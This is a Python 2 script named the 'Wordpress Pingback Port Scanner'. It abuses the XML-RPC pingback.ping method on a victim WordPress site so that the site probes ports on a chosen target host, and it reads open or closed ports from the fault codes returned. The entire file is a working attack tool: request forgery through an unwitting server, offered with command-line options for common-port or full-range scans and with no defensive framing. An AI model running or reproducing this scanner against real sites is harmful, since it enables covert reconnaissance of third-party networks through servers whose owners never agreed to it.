#!/usr/bin/env python
import xmlrpclib
import argparse
from urlparse import urlparse
import urllib2
import re


__version__ = '0.1'

parser = argparse.ArgumentParser(
            prog='wpps.py',
            description='Wordpress Pingback Port Scanner'
         )
parser.add_argument('-a', '--all',
            action='store_true',
            help='scan all port',
            default=False)
parser.add_argument('-t', '--target',
            action='store',
            help='target host (default localhost)',
            required=False)
parser.add_argument('victim', action='store')
parser.add_argument('-v', '--version',
            action='version',
            version=__version__)


def get_valid_post(rpc_proxy, victim):
    url = urlparse(victim)
    rss_url = '%s://%s%s/?feed=rss2' % (url.scheme, url.netloc,
                                        '/'.join(url.path.split('/')[:-1]))
    rss = urllib2.urlopen(rss_url).read()

    pattern = re.compile('<link>([^<]+)</link>', re.IGNORECASE)
    pages = pattern.findall(rss)
    for page in pages:
        try:
            rpc_proxy.pingback.ping(
                        'http://www.google.com',
                        page)
        except Exception as e:
            if e.faultCode == 3:
                continue
            elif e.faultCode == 17:
                return page


def scan(rpc_proxy, ports, target, page):
    for port in ports:
        try:
            rpc_proxy.pingback.ping(
                'http://%s:%d' % (target, port),
                page)
        except Exception as e:
            if e.faultCode == 17 or e.faultCode == 32:
                print '[+] port %s open' % port
            else:
                print '[-] port %s closed' % port


if __name__ == '__main__':
    args = parser.parse_args()
    print '[+] Starting to scan'
    print '[+] Victim : %s' % args.victim

    if args.all:
        ports = xrange(1, 65536)
        print '[+] Scan all port'
    else:
        ports = [21, 22, 25, 53, 80, 106, 110, 143,
                443, 3306, 3389, 8443, 9999]
        print '[+] Scan common port'

    if args.target:
        target = args.target
    else:
        url = urlparse(args.victim)
        target = url.netloc
    print '[+] Target : %s' % target
    print

    server = xmlrpclib.ServerProxy(args.victim)
    page = get_valid_post(server, args.victim)
    scan(server, ports, target, page)

    print
    print '[+] Scan finished'
